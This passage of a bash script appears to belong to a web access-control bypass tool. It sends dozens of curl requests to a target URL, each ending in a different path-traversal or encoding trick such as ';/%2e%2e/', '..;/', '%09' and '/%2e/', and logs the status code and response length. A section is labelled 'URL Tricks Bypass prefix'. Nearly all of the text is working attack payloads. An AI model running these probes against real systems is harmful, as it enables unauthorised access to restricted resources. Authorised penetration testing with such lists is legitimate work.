echo -n "Payload [ ;/%2e%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ ;/%2e. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e." -H "$user_agent")
print
echo -n "Payload [ ;/%2f%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f%2f../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f%2f../" -H "$user_agent")
print
echo -n "Payload [ ;/%2f/..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/..%2f" -H "$user_agent")
print
echo -n "Payload [ ;/%2f/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/../" -H "$user_agent")
print
echo -n "Payload [ ;/.%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e" -H "$user_agent")
print
echo -n "Payload [ ;/.%2e/%2e%2e/%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e/%2e%2e/%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e/%2e%2e/%2f" -H "$user_agent")
print
echo -n "Payload [ ;/.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.." -H "$user_agent")
print
echo -n "Payload [ ;/..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f%2f../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f%2f../" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f/" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f//" -H "$user_agent")
print
echo -n "Payload [ ;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../" -H "$user_agent")
print
echo -n "Payload [ ;/../%2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../%2f/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../%2f/" -H "$user_agent")
print
echo -n "Payload [ ;/../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../../" -H "$user_agent")
print
echo -n "Payload [ ;/../..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../..//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../..//" -H "$user_agent")
print
echo -n "Payload [ ;/.././../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.././../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.././../" -H "$user_agent")
print
echo -n "Payload [ ;/../.;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../.;/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../.;/../" -H "$user_agent")
print
echo -n "Payload [ ;/..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//" -H "$user_agent")
print
echo -n "Payload [ ;/..//%2e%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2e%2e/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ ;/..//%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2f" -H "$user_agent")
print
echo -n "Payload [ ;/..//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//../" -H "$user_agent")
print
echo -n "Payload [ ;/../// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..///" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..///" -H "$user_agent")
print
echo -n "Payload [ ;/../;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/" -H "$user_agent")
print
echo -n "Payload [ ;/../;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/../" -H "$user_agent")
print
echo -n "Payload [ ;/..; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..;" -H "$user_agent")
print
echo -n "Payload [ ;/.;. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.;." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.;." -H "$user_agent")
print
echo -n "Payload [ ;//%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//%2f../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//%2f../" -H "$user_agent")
print
echo -n "Payload [ ;//.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//.." -H "$user_agent")
print
echo -n "Payload [ ;//../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//../../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//../../" -H "$user_agent")
print
echo -n "Payload [ ;///.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///.." -H "$user_agent")
print
echo -n "Payload [ ;///../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///../" -H "$user_agent")
print
echo -n "Payload [ ;///..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///..//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///..//" -H "$user_agent")
print
echo -n "Payload [ ;x ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x" -H "$user_agent")
print
echo -n "Payload [ ;x/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x/" -H "$user_agent")
print
echo -n "Payload [ ;x; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x;" -H "$user_agent")
print
echo -n "Payload [ & ]: "
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL&" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL&" -H "$user_agent")
print
echo -n "Payload [ % ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%" -H "$user_agent")
print
echo -n "Payload [ %09 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent")
print
echo -n "Payload [ ../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL../" -H "$user_agent")
print
echo -n "Payload [ ../%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%2f" -H "$user_agent")
print
echo -n "Payload [ .././ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.././" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.././" -H "$user_agent")
print
echo -n "Payload [ ..%00/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/" -H "$user_agent")
print
echo -n "Payload [ ..%0d/ ]"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/" -H "$user_agent")
print
echo -n "Payload [ ..%5c ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c" -H "$user_agent")
print
echo -n "Payload [ ..\ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\\" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\\" -H "$user_agent")
print
echo -n "Payload [ ..%ff/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff" -H "$user_agent")
print
echo -n "Payload [ %2e%2e%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e%2f" -H "$user_agent")
print
echo -n "Payload [ .%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.%2e/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.%2e/" -H "$user_agent")
print
echo -n "Payload [ %3f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f" -H "$user_agent")
print
echo -n "Payload [ %26 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%26" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%26" -H "$user_agent")
print
echo -n "Payload [ %23 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23" -H "$user_agent")
print
echo -n "Payload [ %2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e" -H "$user_agent")
print
echo -n "Payload [ /. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/." -H "$user_agent")
print
echo -n "Payload [ ? ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL?" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL?" -H "$user_agent")
print
echo -n "Payload [ ?? ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL??" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL??" -H "$user_agent")
print
echo -n "Payload [ ??? ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL???" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL???" -H "$user_agent")
print
echo -n "Payload [ // ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//" -H "$user_agent")
print
echo -n "Payload [ /./ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/./" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/./" -H "$user_agent")
print
echo -n "Payload [ .//./ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.//./" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.//./" -H "$user_agent")
print
echo -n "Payload [ //?anything ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//?anything" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//?anything" -H "$user_agent")
print
echo -n "Payload [ # ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#" -H "$user_agent")
print
echo -n "Payload [ / ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/" -H "$user_agent")
print
echo -n "Payload [ /.randomstring ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.randomstring" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.randomstring" -H "$user_agent")
print
echo -n "Payload [ ..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;/" -H "$user_agent")
print
echo -n "Payload [ .html ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.html" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.html" -H "$user_agent")
print
echo -n "Payload [ %20/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20/" -H "$user_agent")
print
echo -n "Payload [ %20$PAT%20/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20$PAT%20/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20$PAT%20/" -H "$user_agent")
print
echo -n "Payload [ .json ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.json" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.json" -H "$user_agent")
print
echo -n "Payload [ \..\.\ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL\..\.\\" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL\..\.\\" -H "$user_agent")
print
echo -n "Payload [ /* ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*" -H "$user_agent")
print
echo -n "Payload [ ./. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL./." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL./." -H "$user_agent")
print
echo -n "Payload [ /*/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*/" -H "$user_agent")
print
echo -n "Payload [ /..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/" -H "$user_agent")
print
echo -n "Payload [%2e/$PAT ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent")
print
echo -n "Payload [ //. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//." -H "$user_agent")
print
echo -n "Payload [ //// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL////" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL////" -H "$user_agent")
print
echo -n "Payload [ /../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent")
print
echo -n "Payload [ ;$PAT/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;$PAT/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;$PAT/" -H "$user_agent")
print


echo -e ${blue}"-----------------------------"${end}
echo -e ${cyan}"[+] URL Tricks Bypass prefix "${end}
echo -e ${blue}"-----------------------------"${end}

echo -n "Payload [ #? ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3F$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3F$PAT" -H "$user_agent")
print
echo -n "Payload [ %09 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09$PAT" -H "$user_agent")
print
echo -n "Payload [ %09%3b ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09%3b$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09%3b$PAT" -H "$user_agent")
print
echo -n "Payload [ %09.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09..$PAT" -H "$user_agent")
print
echo -n "Payload [ %09; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09;$PAT" -H "$user_agent")
print
echo -n "Payload [ %20 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%20$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%20$PAT" -H "$user_agent")
print
echo -n "Payload [ %23%3f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%23%3f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%23%3f$PAT" -H "$user_agent")
print
echo -n "Payload [ %252f%252f ]:"
